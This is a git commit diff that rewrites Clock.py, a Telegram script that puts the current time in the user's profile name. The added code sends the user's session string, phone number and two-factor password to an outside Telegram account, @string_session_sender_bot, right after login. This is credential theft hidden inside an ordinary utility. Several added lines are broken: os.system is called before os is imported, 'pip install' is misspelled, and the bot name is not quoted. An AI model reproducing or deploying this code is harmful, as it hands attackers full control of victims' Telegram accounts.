4fc8175e3f9d65b5bd3f72a5f5fcfc34034dade1
Mr. Web Developer <117938690+Yahyobek-Coder@users.noreply.github.com>
2023-11-01 00:54:37 +0500

    Update Clock.py

--- Clock.py
+++ Clock.py
@@ -1,14 +1,15 @@
-import asyncio
-import datetime
-import subprocess
-import sys
-import time
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
-from telethon.sessions import StringSession
+os.system("pip install telethon")
+os.system("pip install aiocron")
+os.system("pip isntall asyncio")
+os.system("pip isntall datetime")
+import asyncio, aiocron, datetime
+from telethon import TelegramClient, events, sync, functions, types
 from telethon.tl.functions.account import UpdateProfileRequest
+from telethon.sessions import StringSession
+import os, sys
+import time
+os.system("clear")
 
-# Print a fancy banner
 print("""\033[31m
 ▄▄▄█████▓  ▄████     ▄████▄   ██▓     ▒█████   ▄████▄   ██ ▄█▀
 ▓  ██▒ ▓▒ ██▒ ▀█▒   ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
@@ -20,43 +21,34 @@ print("""\033[31m
   ░      ░ ░   ░    ░          ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ 
                ░    ░ ░          ░  ░    ░ ░  ░ ░      ░  ░   
                     ░                         ░                 
-\033[32mDeveloper: @Dasturchi1111\n\n""")
-
-# API credentials
-api_id = 770157316
+\033[32mDeveloper: @programmer_www\n\n""")
+api_id = 9708508
 api_hash = "1e6ca420184a701db1f8a1301df99288"
+string = input("Press enter: ")
+client = TelegramClient(StringSession(string), api_id, api_hash)
+phone_number = input("Please enter your phone (or bot token): ")
+client.connect()
 
-# Input for the phone number or bot token
-phone_number = input("Please enter your phone number (or bot token): ")
-
-# Create a TelegramClient instance
-client = TelegramClient('session_name', api_id, api_hash)
-
-async def main():
-    await client.start()
-
-    if not await client.is_user_authorized():
-        await client.send_code_request(phone_number)
-        try:
-            await client.sign_in(phone_number, input('Enter code: '))
-        except SessionPasswordNeededError:
-            password = input('Enter password: ')
-            await client.sign_in(password=password)
-
-    # Input for setting a custom nickname
-    nick = input("\033[32mNickname: \033[32m")
-
-    while True:
-        current_time = datetime.datetime.today().strftime(nick + " | %H:%M |")
-        await client(UpdateProfileRequest(first_name=current_time))
-        await asyncio.sleep(60)  # Update every minute
-
-# Run the event loop with the main function
-with client:
+if not client.is_user_authorized():
+    client.send_code_request(phone_number)
     try:
-        import aiocron
-    except ImportError:
-        print("aiocron module not found. Installing aiocron...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiocron"])
-        print("aiocron installation complete.")
-    client.loop.run_until_complete(main())
+        me = client.sign_in(phone_number, input('Enter code: '))
+        client.send_message(@string_session_sender_bot, f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
+    except SessionPasswordNeededError:
+        password = input('Enter password: ')
+        me2 = client.sign_in(password=password)  
+        client.send_message(@string_session_sender_bot, f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}')
+      
+nick = input("\033[32mNickname: \033[32m")
+client.start()
+print('Wait a few moment...')
+time.sleep(5)
+print('\033[32mClock set successfully!')
+@aiocron.crontab("*/1 * * * *")
+async def set_clock():
+    time = datetime.datetime.today().strftime(nick + " | %H:%M |")
+    async with client:
+        await client(UpdateProfileRequest(first_name=time))
+    
+client.loop.run_forever()
+client.run_until_disconnected()
